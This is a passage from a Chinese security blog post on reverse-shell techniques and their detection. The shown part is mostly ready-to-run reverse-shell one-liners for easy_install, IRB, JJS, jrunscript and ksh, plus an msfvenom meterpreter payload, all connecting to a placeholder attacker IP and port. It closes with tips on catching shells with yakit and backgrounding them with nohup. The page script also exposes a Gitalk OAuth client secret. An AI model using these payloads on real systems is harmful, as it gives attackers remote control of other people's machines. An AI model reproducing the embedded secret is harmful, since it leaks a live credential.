+<p>还是没法强交互</p>
+<h2 id="easy-install"><a href="#easy-install" class="headerlink" title="easy_install"></a>easy_install</h2><p>监听</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">socat file:`<span class="built_in">tty</span>`,raw,<span class="built_in">echo</span>=0 tcp-listen:&lt;attack_port&gt;</span><br></pre></td></tr></table></figure>
+<p>反弹</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">export</span> RHOST=<span class="string">&#x27;&lt;attack_ip&gt;&#x27;</span></span><br><span class="line"><span class="built_in">export</span> RPORT=&lt;attack_port&gt;</span><br><span class="line">TF=$(<span class="built_in">mktemp</span> -d)</span><br><span class="line"><span class="built_in">echo</span> <span class="string">&#x27;import sys,socket,os,pty;s=socket.socket() \</span></span><br><span class="line"><span class="string">s.connect((os.getenv(&quot;RHOST&quot;),int(os.getenv(&quot;RPORT&quot;))))\</span></span><br><span class="line"><span class="string">[os.dup2(s.fileno(),fd) for fd in (0,1,2)] \</span></span><br><span class="line"><span class="string">pty.spawn(&quot;/bin/sh&quot;)&#x27;</span> &gt; <span class="variable">$TF</span>/setup.py</span><br><span class="line">easy_install <span class="variable">$TF</span></span><br></pre></td></tr></table></figure>
+<h2 id="IRB"><a href="#IRB" class="headerlink" title="IRB"></a>IRB</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">export</span> RHOST=<span class="string">&#x27;&lt;attack_ip&gt;&#x27;</span></span><br><span class="line"><span class="built_in">export</span> RPORT=&lt;attack_port&gt;</span><br><span class="line">irb</span><br><span class="line">require <span class="string">&#x27;socket&#x27;</span>; <span class="built_in">exit</span> <span class="keyword">if</span></span><br><span class="line">fork;c=TCPSocket.new(ENV[<span class="string">&quot;RHOST&quot;</span>],ENV[<span class="string">&quot;RPORT&quot;</span>]);<span class="keyword">while</span>(cmd=c.gets);IO.popen(cmd,</span><br><span class="line"><span class="string">&quot;r&quot;</span>)</span><br><span class="line">&#123;|io|c.print io.read&#125; end</span><br></pre></td></tr></table></figure>
+<h2 id="JJS"><a href="#JJS" class="headerlink" title="JJS"></a>JJS</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">export</span> RHOST=&lt;attack_ip&gt;</span><br><span class="line"><span class="built_in">export</span> RPORT=&lt;attack_port&gt;</span><br><span class="line"><span class="built_in">echo</span> <span class="string">&#x27;var host=Java.type(&quot;java.lang.System&quot;).getenv(&quot;RHOST&quot;);</span></span><br><span class="line"><span class="string">var port=Java.type(&quot;java.lang.System&quot;).getenv(&quot;RPORT&quot;);</span></span><br><span class="line"><span class="string">var ProcessBuilder = Java.type(&quot;java.lang.ProcessBuilder&quot;);</span></span><br><span class="line"><span class="string">var p=new ProcessBuilder(&quot;/bin/bash&quot;</span></span><br><span class="line"><span class="string">,</span></span><br><span class="line"><span class="string">&quot;-i&quot;).redirectErrorStream(true).start();</span></span><br><span class="line"><span class="string">var Socket = Java.type(&quot;java.net.Socket&quot;);</span></span><br><span class="line"><span class="string">var s=new Socket(host,port);</span></span><br><span class="line"><span class="string">var pi=p.getInputStream(),pe=p.getErrorStream(),si=s.getInputStream();</span></span><br><span class="line"><span class="string">var po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed())&#123;</span></span><br><span class="line"><span class="string">while(pi.available()&gt;0)so.write(pi.read()); while(pe.available()&gt;0)so.write(pe.read());</span></span><br><span class="line"><span class="string">while(si.available()&gt;0)po.write(si.read()); so.flush();po.flush();</span></span><br><span class="line"><span class="string">Java.type(&quot;java.lang.Thread&quot;).sleep(50); try &#123;p.exitValue();break;&#125;catch (e)</span></span><br><span class="line"><span class="string">&#123;&#125;&#125;;p.destroy();s.close();&#x27;</span> | jjs</span><br></pre></td></tr></table></figure>
+<h2 id="jrunscript"><a href="#jrunscript" class="headerlink" title="jrunscript"></a>jrunscript</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">export</span> RHOST=&lt;attack_ip&gt;</span><br><span class="line"><span class="built_in">export</span> RPORT=&lt;attack_port&gt;</span><br><span class="line">jrunscript -e <span class="string">&#x27;var host=&#x27;</span><span class="string">&quot;&#x27;&quot;</span><span class="string">&quot;<span class="variable">$RHOST</span>&quot;</span><span class="string">&quot;&#x27;&quot;</span><span class="string">&#x27;; var port=&#x27;</span><span class="string">&quot;<span class="variable">$RPORT</span>&quot;</span><span class="string">&#x27;;var p=new java.lang.ProcessBuilder(&quot;/bin/bash&quot;,&quot;-i&quot;).redirectErrorStream(true).start();var s=new java.net.Socket(host,port);var pi=p.getInputStream(),pe=p.getErrorStream(),si=s.getInputStream();var po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed())&#123;while(pi.available()&gt;0)so.write(pi.read());while(pe.available()&gt;0)so.write(pe.read());while(si.available()&gt;0)po.write(si.read());so.flush();po.flush();java.lang.Thread.sleep(50);try &#123;p.exitValue();break;&#125;catch (e)&#123;&#125;&#125;;p.destroy();s.close();&#x27;</span></span><br></pre></td></tr></table></figure>
+<h2 id="ksh"><a href="#ksh" class="headerlink" title="ksh"></a>ksh</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">ksh -c <span class="string">&#x27;ksh -i &gt; /dev/tcp/&lt;attack_ip&gt;/&lt;attack_port&gt; 2&gt;&amp;1 0&gt;&amp;1&#x27;</span></span><br></pre></td></tr></table></figure>
+<h2 id="MSF"><a href="#MSF" class="headerlink" title="MSF"></a>MSF</h2><p>msf shell</p>
+<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=192.168.3.6 LPORT=4242 -f elf &gt; reverse.elf</span><br></pre></td></tr></table></figure>
+<h1 id="接收shell注意事项"><a href="#接收shell注意事项" class="headerlink" title="接收shell注意事项"></a>接收shell注意事项</h1><h2 id="yakit接收"><a href="#yakit接收" class="headerlink" title="yakit接收"></a>yakit接收</h2><p>这边部署了一下公网上的yakit，效果不错</p>
+<p>上文提到很多shell没法强交互，比如用vim之类的操作；这样会导致渗透的时候比较麻烦。</p>
+<p>而yakit该工具能方便的开启tcp监听，同时所有的shell均有良好的交互性</p>
+<blockquote>
+<p>当然 yakit不止于此，是个很强大的工具</p>
+<p>不过不建议在国内服务器部署 安全组的确比较麻烦人</p>
+</blockquote>
+<h2 id="安全组"><a href="#安全组" class="headerlink" title="安全组"></a>安全组</h2><p>有安全组的实例要先打开安全组</p>
+<h2 id="进程阻塞"><a href="#进程阻塞" class="headerlink" title="进程阻塞"></a>进程阻塞</h2><p>有的shell利用会导致网站进程阻塞，避免测试麻烦，可以考虑将shell进程转入后台运行</p>
+<p>挺多种办法的。</p>
+<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="built_in">nohup</span> &lt;cmd&gt; &amp;</span><br></pre></td></tr></table></figure>
+<h1 id="安全声明"><a href="#安全声明" class="headerlink" title="安全声明"></a>安全声明</h1><p>本文内容仅供学习参考</p>
+</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta"><i class="fas fa-circle-user fa-fw"></i>文章作者: </span><span class="post-copyright-info"><a href="lincoxi">lincoxi</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta"><i class="fas fa-square-arrow-up-right fa-fw"></i>文章链接: </span><span class="post-copyright-info"><a href="https://lincoxi.top/2024/06/10/">https://lincoxi.top/2024/06/10/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta"><i class="fas fa-circle-exclamation fa-fw"></i>版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来自 <a href="https://lincoxi.top" target="_blank">Linnco的小站</a>！</span></div></div><div class="tag_share"><div class="post-meta__tag-list"></div><div class="post_share"><div class="social-share" data-image="/img/tom.WEBP" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><div class="next-post pull-full"><a href="/2024/06/07/" title="reqable配合iphone抓包"><div class="cover" style="background: var(--default-bg-color)"></div><div class="pagination-info"><div class="label">下一篇</div><div class="next_info">reqable配合iphone抓包</div></div></a></div></nav><hr class="custom-hr"/><div id="post-comment"><div class="comment-head"><div class="comment-headline"><i class="fas fa-comments fa-fw"></i><span> 评论</span></div><div class="comment-switch"><span class="first-comment">Valine</span><span id="switch-btn"></span><span class="second-comment">Gitalk</span></div></div><div class="comment-wrap"><div><div class="vcomment" id="vcomment"></div></div><div><div id="gitalk-container"></div></div></div></div></div><div class="aside-content" id="aside-content"><div class="card-widget card-info"><div class="is-center"><div class="avatar-img"><img src="/img/tom.WEBP" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info__name">lincoxi</div><div class="author-info__description">that's ok</div></div><div class="card-info-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">34</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">4</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">8</div></a></div><a id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/cyan4run"><i class="fab fa-github"></i><span>Follow Me</span></a><div class="card-info-social-icons is-center"><a class="social-icon" href="https://github.com/cyan4run" target="_blank" title="Github"><i class="fab fa-github" style="color: ;"></i></a><a class="social-icon" href="mailto:eytime@163.com" target="_blank" title="Email"><i class="fas fa-envelope" style="color: ;"></i></a></div></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn fa-shake"></i><span>公告</span></div><div class="announcement_content">This is my Blog</div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>目录</span><span class="toc-percentage"></span></div><div class="toc-content is-expand"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#CWPP"><span class="toc-number">1.</span> <span class="toc-text">CWPP</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%8F%8D%E5%BC%B9shell%E5%92%8C%E6%A3%80%E6%B5%8B"><span class="toc-number">2.</span> <span class="toc-text">反弹shell和检测</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%A4%9A%E7%A7%8D%E5%BD%A2%E5%BC%8F"><span class="toc-number">2.1.</span> <span class="toc-text">多种形式</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#UDP-shell"><span class="toc-number">2.1.1.</span> <span class="toc-text">UDP shell</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Socat"><span class="toc-number">2.1.2.</span> <span class="toc-text">Socat</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%A3%80%E6%B5%8Bsocat-shell"><span class="toc-number">2.1.2.1.</span> <span class="toc-text">检测socat shell</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Perl"><span class="toc-number">2.2.</span> <span class="toc-text">Perl</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%A3%80%E6%B5%8B-Perl-Shell"><span class="toc-number">2.2.1.</span> <span class="toc-text">检测 Perl Shell</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#python"><span class="toc-number">2.3.</span> <span class="toc-text">python</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%A3%80%E6%B5%8B%E6%96%B9%E6%B3%95"><span class="toc-number">2.3.1.</span> <span class="toc-text">检测方法</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Ruby"><span class="toc-number">2.4.</span> <span class="toc-text">Ruby</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Golang"><span class="toc-number">2.5.</span> <span class="toc-text">Golang</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#PHP"><span class="toc-number">2.6.</span> <span class="toc-text">PHP</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Netcat-Traditional"><span class="toc-number">2.7.</span> <span class="toc-text">Netcat Traditional</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%A3%80%E6%B5%8B"><span class="toc-number">2.7.1.</span> <span class="toc-text">检测</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Netcat-OpenBsd"><span class="toc-number">2.8.</span> <span class="toc-text">Netcat OpenBsd</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Ncat"><span class="toc-number">2.9.</span> <span class="toc-text">Ncat</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#OpenSSL"><span class="toc-number">2.10.</span> <span class="toc-text">OpenSSL</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#AWK"><span class="toc-number">2.11.</span> <span class="toc-text">AWK</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Lua"><span class="toc-number">2.12.</span> <span class="toc-text">Lua</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Nodejs"><span class="toc-number">2.13.</span> <span class="toc-text">Nodejs</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#JAVA"><span class="toc-number">2.14.</span> <span class="toc-text">JAVA</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Cpan"><span class="toc-number">2.15.</span> <span class="toc-text">Cpan</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#gdb"><span class="toc-number">2.16.</span> <span class="toc-text">gdb</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#easy-install"><span class="toc-number">2.17.</span> <span class="toc-text">easy_install</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#IRB"><span class="toc-number">2.18.</span> <span class="toc-text">IRB</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#JJS"><span class="toc-number">2.19.</span> <span class="toc-text">JJS</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#jrunscript"><span class="toc-number">2.20.</span> <span class="toc-text">jrunscript</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#ksh"><span class="toc-number">2.21.</span> <span class="toc-text">ksh</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#MSF"><span class="toc-number">2.22.</span> <span class="toc-text">MSF</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%8E%A5%E6%94%B6shell%E6%B3%A8%E6%84%8F%E4%BA%8B%E9%A1%B9"><span class="toc-number">3.</span> <span class="toc-text">接收shell注意事项</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#yakit%E6%8E%A5%E6%94%B6"><span class="toc-number">3.1.</span> <span class="toc-text">yakit接收</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%AE%89%E5%85%A8%E7%BB%84"><span class="toc-number">3.2.</span> <span class="toc-text">安全组</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%BF%9B%E7%A8%8B%E9%98%BB%E5%A1%9E"><span class="toc-number">3.3.</span> <span class="toc-text">进程阻塞</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%AE%89%E5%85%A8%E5%A3%B0%E6%98%8E"><span class="toc-number">4.</span> <span class="toc-text">安全声明</span></a></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>最新文章</span></div><div class="aside-list"><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2024/06/10/" title="反弹shell的姿势与检测">反弹shell的姿势与检测</a><time datetime="2024-06-10T15:07:38.000Z" title="发表于 2024-06-10 23:07:38">2024-06-10</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2024/06/07/" title="reqable配合iphone抓包">reqable配合iphone抓包</a><time datetime="2024-06-07T11:40:21.000Z" title="发表于 2024-06-07 19:40:21">2024-06-07</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2024/06/02/" title="控制单元的设计">控制单元的设计</a><time datetime="2024-06-02T12:55:06.000Z" title="发表于 2024-06-02 20:55:06">2024-06-02</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2024/06/02/" title="控制单元的功能">控制单元的功能</a><time datetime="2024-06-02T11:25:09.000Z" title="发表于 2024-06-02 19:25:09">2024-06-02</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2024/05/21/" title="计算机的运算方式">计算机的运算方式</a><time datetime="2024-05-21T11:30:00.000Z" title="发表于 2024-05-21 19:30:00">2024-05-21</time></div></div></div></div></div></div></main><footer id="footer"><div id="footer-wrap"><div class="framework-info"><span>框架 </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo</a><span class="footer-separator">|</span><span>主题 </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly</a></div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="浅色和深色模式转换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside-config" type="button" title="设置"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="fas fa-list-ul"></i></button><a id="to_comment" href="#post-comment" title="直达评论"><i class="fas fa-comments"></i></a><button id="go-up" type="button" title="回到顶部"><span class="scroll-percent"></span><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox/fancybox.umd.min.js"></script><div class="js-pjax"><script>if (!window.MathJax) {
+  window.MathJax = {
+    tex: {
+      inlineMath: [['$', '$'], ['\\(', '\\)']],
+      tags: 'ams'
+    },
+    chtml: {
+      scale: 1.1
+    },
+    options: {
+      renderActions: {
+        findScript: [10, doc => {
+          for (const node of document.querySelectorAll('script[type^="math/tex"]')) {
+            const display = !!node.type.match(/; *mode=display/)
+            const math = new doc.options.MathItem(node.textContent, doc.inputJax[0], display)
+            const text = document.createTextNode('')
+            node.parentNode.replaceChild(text, node)
+            math.start = {node: text, delim: '', n: 0}
+            math.end = {node: text, delim: '', n: 0}
+            doc.math.push(math)
+          }
+        }, '']
+      }
+    }
+  }
+  
+  const script = document.createElement('script')
+  script.src = 'https://cdn.jsdelivr.net/npm/mathjax/es5/tex-mml-chtml.min.js'
+  script.id = 'MathJax-script'
+  script.async = true
+  document.head.appendChild(script)
+} else {
+  MathJax.startup.document.state(0)
+  MathJax.texReset()
+  MathJax.typesetPromise()
+}</script><script>(() => {
+  const initValine = () => {
+    const valine = new Valine(Object.assign({
+      el: '#vcomment',
+      appId: 'i90QJFuyhHAVYRBQ9QRMjmhD-gzGzoHsz',
+      appKey: 'b6UJRPJk1JYOZVTNqtZcc2AP',
+      avatar: 'monsterid',
+      serverURLs: '',
+      emojiMaps: "",
+      path: window.location.pathname,
+      visitor: true
+    }, null))
+  }
+
+  const loadValine = async () => {
+    if (typeof Valine === 'function') initValine()
+    else {
+      await getScript('https://cdn.jsdelivr.net/npm/valine/dist/Valine.min.js')
+      initValine()
+    }
+  }
+
+  if ('Valine' === 'Valine' || !false) {
+    if (false) btf.loadComment(document.getElementById('vcomment'),loadValine)
+    else setTimeout(loadValine, 0)
+  } else {
+    window.loadOtherComment = loadValine
+  }
+})()</script><script>(() => {
+  const initGitalk = () => {
+    const gitalk = new Gitalk(Object.assign({
+      clientID: 'c1b311a4bb95d53dbbcb',
+      clientSecret: 'a411c4d9d232192aba53ad0c8fbff025a3616033',
+      repo: 'cyan4comment',
+      owner: 'cyan4run',
+      admin: ['cyan4run'],
+      id: '7ea96289a6cd49bb10c94e19b7888f73',
+      updateCountCallback: commentCount
+    },null))
+
+    gitalk.render('gitalk-container')
+  }
+
+  const loadGitalk = async() => {
+    if (typeof Gitalk === 'function') initGitalk()
+    else {
+      await getCSS('https://cdn.jsdelivr.net/npm/gitalk/dist/gitalk.min.css')
+      await getScript('https://cdn.jsdelivr.net/npm/gitalk/dist/gitalk.min.js')
+      initGitalk()
+    }
+  }
+  
+  const commentCount = n => {
+    const isCommentCount = document.querySelector('#post-meta .gitalk-comment-count')
+    if (isCommentCount) {
+      isCommentCount.textContent= n
+    }
+  }
+
+  if ('Valine' === 'Gitalk' || !false) {
+    if (false) btf.loadComment(document.getElementById('gitalk-container'), loadGitalk)
+    else loadGitalk()
+  } else {
+    window.loadOtherComment = loadGitalk
+  }
+})()</script></div><canvas class="fireworks" mobile="false"></canvas><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/dist/fireworks.min.js"></script><script id="canvas_nest" defer="defer" color="0,0,255" opacity="0.7" zIndex="-1" count="99" mobile="false" src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/dist/canvas-nest.min.js"></script><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/dist/activate-power-mode.min.js"></script><script>POWERMODE.colorful = true;
+POWERMODE.shake = false;
+POWERMODE.mobile = false;
+document.body.addEventListener('input', POWERMODE);
+</script><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script><div id="local-search"><div class="search-dialog"><nav class="search-nav"><span class="search-dialog-title">搜索</span><span id="loading-status"></span><button class="search-close-button"><i class="fas fa-times"></i></button></nav><div class="is-center" id="loading-database"><i class="fas fa-spinner fa-pulse"></i><span>  数据库加载中</span></div><div class="search-wrap"><div id="local-search-input"><div class="local-search-box"><input class="local-search-box--input" placeholder="搜索文章" type="text"/></div></div><hr/><div id="local-search-results"></div><div id="local-search-stats-wrap"></div></div></div><div id="search-mask"></div><script src="/js/search/local-search.js"></script></div></div></body></html>
